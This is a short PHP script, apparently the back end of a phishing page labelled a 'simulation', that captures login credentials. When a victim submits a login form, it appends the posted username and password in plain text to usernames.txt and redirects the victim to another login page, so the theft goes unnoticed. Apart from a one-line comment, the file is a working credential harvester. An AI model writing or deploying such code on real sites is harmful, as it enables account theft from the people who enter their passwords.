<?php
// This simulation is created by Atharv Hogade. Do not misuse it.


file_put_contents("usernames.txt", "Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: ./login3.html');
exit();
?>